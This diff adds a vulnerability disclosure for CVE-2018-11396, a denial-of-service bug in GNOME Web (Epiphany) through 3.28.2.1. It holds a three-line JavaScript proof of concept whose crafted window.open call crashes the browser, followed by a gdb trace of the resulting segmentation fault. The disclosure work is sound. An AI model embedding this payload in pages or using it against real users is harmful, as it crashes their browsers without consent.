@@ -1,0 +1,42 @@
+Summary:
+ephy-session.c in libephymain.so in GNOME Web (aka Epiphany) through 3.28.2.1 allows remote attackers to cause a denial of service (application crash) via JavaScript code that triggers access to a NULL URL, as demonstrated by a crafted window.open call, CVE-2018-11396 was assigned to this issue.
+
+PoC:
+<script>
+win = window.open("hello world");
+</script>
+
+Stack trace:
+ftw@ftw-box:~$ gdb epiphany
+(gdb) run
+Starting program: /usr/bin/epiphany 
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+[New Thread 0x7fffe08bc700 (LWP 2279)]
+[New Thread 0x7fffdee51700 (LWP 2280)]
+[New Thread 0x7fffde650700 (LWP 2281)]
+[New Thread 0x7fffdcdd5700 (LWP 2282)]
+[New Thread 0x7fffd7fff700 (LWP 2283)]
+[New Thread 0x7fffd77fe700 (LWP 2284)]
+[New Thread 0x7fffd6ffd700 (LWP 2285)]
+[New Thread 0x7fffd67fc700 (LWP 2286)]
+[New Thread 0x7fffd5b8c700 (LWP 2287)]
+[New Thread 0x7fffd538b700 (LWP 2288)]
+[New Thread 0x7fff8f486700 (LWP 2294)]
+[New Thread 0x7fff8da1e700 (LWP 2304)]
+[New Thread 0x7fff8d21d700 (LWP 2305)]
+[New Thread 0x7fff8ea7f700 (LWP 2315)]
+[Thread 0x7fffd5b8c700 (LWP 2287) exited]
+[Thread 0x7fffd67fc700 (LWP 2286) exited]
+
+Thread 15 "pool" received signal SIGSEGV, Segmentation fault.
+[Switching to Thread 0x7fff8ea7f700 (LWP 2315)]
+0x00007ffff7b75db7 in ?? () from /usr/lib/x86_64-linux-gnu/epiphany-browser/libephymain.so
+(gdb) bt
+#0  0x00007ffff7b75db7 in ?? () from /usr/lib/x86_64-linux-gnu/epiphany-browser/libephymain.so
+#1  0x00007ffff7079be6 in ?? () from /usr/lib/x86_64-linux-gnu/libgio-2.0.so.0
+#2  0x00007ffff73fe7d0 in ?? () from /usr/lib/x86_64-linux-gnu/libglib-2.0.so.0
+#3  0x00007ffff73fde05 in ?? () from /usr/lib/x86_64-linux-gnu/libglib-2.0.so.0
+#4  0x00007fffefc246db in start_thread (arg=0x7fff8ea7f700) at pthread_create.c:463
+#5  0x00007ffff5e4c88f in clone () at ../sysdeps/unix/sysv/linux/x86_64/clone.S:95
+(gdb)
